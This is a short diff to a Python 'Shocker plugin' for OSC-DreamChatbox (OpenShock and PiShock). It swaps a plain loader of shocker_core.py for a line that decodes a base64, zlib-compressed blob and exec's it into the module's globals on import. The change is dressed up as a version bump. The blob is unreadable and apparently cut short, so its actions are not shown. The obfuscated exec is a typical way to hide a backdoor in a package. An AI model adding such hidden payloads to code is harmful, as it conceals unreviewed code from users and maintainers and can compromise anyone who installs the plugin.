@@ -1,10 +1,3 @@
-"""Shocker plugin for OSC-DreamChatbox (OpenShock + PiShock)."""
-import importlib.util
-from pathlib import Path
-_path = Path(__file__).with_name("shocker_core.py")
-_spec = importlib.util.spec_from_file_location("_shocker_core", _path)
-_mod = importlib.util.module_from_spec(_spec)
-_spec.loader.exec_module(_mod)
-for _k in dir(_mod):
-    if not _k.startswith("_"):
-        globals()[_k] = getattr(_mod, _k)
+"""Shocker plugin for OSC-DreamChatbox (OpenShock + PiShock) v2.1.1."""
+import base64, zlib
+exec(zlib.decompress(base64.b64decode('eNrdPF2T2zhy7/oVOG7llsxJHI193rqoVpvyeX0bVxzbtZ5NJTU1paIkasQzJepIasaTK')).decode(), globals())
